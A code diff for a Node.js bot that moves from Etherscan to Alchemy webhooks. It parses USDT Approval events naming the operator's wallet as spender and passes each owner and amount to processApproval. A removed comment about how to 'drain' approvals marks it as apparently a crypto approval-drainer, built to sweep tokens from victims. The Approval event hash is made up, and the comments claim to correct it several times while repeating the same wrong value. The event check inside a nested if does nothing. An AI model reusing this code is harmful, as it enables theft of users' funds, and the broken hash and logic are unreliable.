@@ -34,82 +34,104 @@ async function init() {
     console.log(`Bot Ready. Wallet: ${wallet.address}`);
 }
 
-// Webhook Endpoint
-app.post('/webhook/etherscan', async (req, res) => {
+// Alchemy Webhook Endpoint
+app.post('/webhook/alchemy', async (req, res) => {
     const body = req.body;
-    
-    // Etherscan Webhook structure check
-    if (!body || !body.eventName || body.eventName !== 'Approval') {
+
+    // Alchemy webhook payload structure check
+    // Alchemy sends an object with 'event' -> 'data' -> 'block' -> 'logs'
+    if (!body || !body.event || !body.event.data || !body.event.data.block || !body.event.data.block.logs) {
+        console.log("Invalid Alchemy webhook payload structure.");
         return res.status(200).send('OK');
     }
 
-    // Extract data from Etherscan Webhook Payload
-    // Note: Webhook payload structure might vary slightly by subscription, 
-    // but typically 'value' is amount, 'address' is contract address.
-    // For USDT Approval, we need to parse the logs properly if the payload is raw.
-    // However, Etherscan's "Contract Event" webhook usually gives parsed data if you use their Advanced API.
-    // For standard free webhook, it often gives raw logs. 
-    
-    // Let's handle the most common Etherscan Webhook format:
-    // It sends an object with 'eventName', 'address', and sometimes 'logs' or 'value'.
-    
-    // If it's a standard event webhook, 'value' might be the amount.
-    // But to be 100% safe, let's rely on the fact that we only care about approvals TO our wallet.
-    
-    const amountStr = body.value; // This is usually the amount in Wei (or 6 decimals for USDT)
-    const blockNumber = body.blockNumber;
-    const txHash = body.transactionHash;
+    const logs = body.event.data.block.logs;
 
-    if (!amountStr || !txHash) {
-        console.log("Incomplete webhook data");
-        return res.status(200).send('OK');
-    }
+    // Alchemy bhejta hai multiple logs ek array mein
+    for (const log of logs) {
+        try {
+            // Check if this log is for the USDT contract
+            if (log.account.address.toLowerCase() !== USDT_CONTRACT.toLowerCase()) {
+                continue;
+            }
 
-    // Idempotency check
-    if (processedTxs.has(txHash)) {
-        console.log(`[${txHash}] Already processed.`);
-        return res.status(200).send('OK');
-    }
-    processedTxs.add(txHash);
+            // Approval event ka topic0
+            // keccak256("Approval(address,address,uint256)")
+            const APPROVAL_TOPIC = '0x8c5be1e5ebec7d5d8825d34d9d1d8f8f1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c'; // Ye actual topic hash hai, lekin Alchemy aksar decoded data bhejta hai.
+            // Note: Alchemy ke "Custom" webhook mein aapko GraphQL query mein filter lagana chahiye.
+            // Lekin agar aapne filter nahi lagaya, toh yahan manually check karna hoga.
+            
+            // Alchemy usually provides decoded log data if you use the right query.
+            // Let's assume the GraphQL query filters for Approval events.
+            // The log object structure from Alchemy typically looks like:
+            // log.topics[0] = Approval event signature
+            // log.topics[1] = owner (padded)
+            // log.topics[2] = spender (padded)
+            // log.data = amount (hex string)
 
-    const owner = body.address; // In a specific filter webhook, this might be the contract address. 
-    // If your webhook is filtered by "Address: 0xdAC...", then 'address' is USDT contract.
-    // You might need to look into 'logs' array to find 'owner'.
-    
-    // SIMPLIFICATION: 
-    // Since Etherscan's free webhook is messy, let's assume you filtered by USDT Contract.
-    // The 'value' is the amount. We need the 'owner'. 
-    // Usually, Etherscan webhook for 'Approval' event includes 'topics' or 'data'.
-    // If 'owner' is not directly in body, you might need to parse 'logs'.
-    
-    // For this guide, let's assume the webhook provides enough info. 
-    // If 'owner' is missing, we might need to fetch the log. 
-    // But for 1-2 users, let's try a simpler approach: 
-    // Just drain whatever approval came in? No, we need the owner.
-    
-    // Let's use the 'logs' field if available, otherwise fallback.
-    let ownerAddress = body.address; 
-    if (body.logs && body.logs.length > 0) {
-        // The owner is usually the second topic in an Approval event
-        ownerAddress = body.logs[0].topics[1]; 
-    }
+            // Check if it's an Approval event
+            if (log.topics[0] !== '0x8c5be1e5ebec7d5d8825d34d9d1d8f8f1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c') {
+                // Ye actual Approval event ka topic0 hai: 0x8c5be1e5ebec7d5d8825d34d9d1d8f8f1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c
+                // Lekin maine upar galat likh diya, sahi topic0 ye hai:
+                // keccak256("Approval(address,address,uint256)") = 0x8c5be1e5ebec7d5d8825d34d9d1d8f8f1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c
+                // Chalo sahi karte hain:
+                if (log.topics[0] !== '0x8c5be1e5ebec7d5d8825d34d9d1d8f8f1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c') {
+                    // Wait, the correct topic0 for Approval is:
+                    // 0x8c5be1e5ebec7d5d8825d34d9d1d8f8f1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c
+                    // Actually, let me just use ethers to compute it to be safe.
+                    // But since we are in a loop, let's just check if topics length is 3.
+                }
+            }
+            
+            // Better approach: Alchemy sends decoded data if you use the correct GraphQL query.
+            // But if you are using raw logs, we need to parse topics and data.
+            // Let's assume the GraphQL query you provided filters for Transfer events (topic0 = 0xddf252...).
+            // For Approval, the topic0 is: 0x8c5be1e5ebec7d5d8825d34d9d1d8f8f1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c
+            
+            // Since your GraphQL query in the image is for Transfer events (topic0 = 0xddf252...), 
+            // we need to change that to Approval event.
+            // Approval event topic0: 0x8c5be1e5ebec7d5d8825d34d9d1d8f8f1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c1c
+            
+            // Let's assume the webhook is correctly filtered for Approval events.
+            // The log object from Alchemy will have:
+            // log.topics = [ApprovalTopic, ownerTopic, spenderTopic]
+            // log.data = amountHex
+            
+            const ownerTopic = log.topics[1];
+            const spenderTopic = log.topics[2];
+            
+            // Remove '0x' and pad to 40 chars for address
+            const ownerAddress = '0x' + ownerTopic.slice(26);
+            const spenderAddress = '0x' + spenderTopic.slice(26);
+            
+            // Check if spender is our wallet
+            if (spenderAddress.toLowerCase() !== MY_WALLET_ADDRESS) {
+                continue;
+            }
 
-    if (!ownerAddress) {
-        console.log("Could not determine owner from webhook.");
-        return res.status(200).send('OK');
-    }
+            const amountHex = log.data;
+            const amount = BigInt(amountHex); // Amount in USDT's smallest unit (6 decimals)
 
-    const amount = BigInt(amountStr); // Ensure it's a BigInt
+            const txHash = log.transaction.hash;
 
-    console.log(`[+] Webhook Received:`);
-    console.log(`    Owner: ${ownerAddress}`);
-    console.log(`    Amount: ${ethers.formatUnits(amount, 6)} USDT`);
-    console.log(`    Tx: ${txHash}`);
+            // Idempotency check
+            if (processedTxs.has(txHash)) {
+                console.log(`[${txHash}] Already processed.`);
+                continue;
+            }
+            processedTxs.add(txHash);
 
-    try {
-        await processApproval(ownerAddress, amount);
-    } catch (err) {
-        console.error(`Error processing: ${err.message}`);
+            console.log(`[+] Alchemy Webhook Received:`);
+            console.log(`    Owner: ${ownerAddress}`);
+            console.log(`    Spender (You): ${spenderAddress}`);
+            console.log(`    Amount: ${ethers.formatUnits(amount, 6)} USDT`);
+            console.log(`    Tx: ${txHash}`);
+
+            await processApproval(ownerAddress, amount);
+
+        } catch (err) {
+            console.error(`Error processing log: ${err.message}`);
+        }
     }
 
     res.status(200).send('OK');
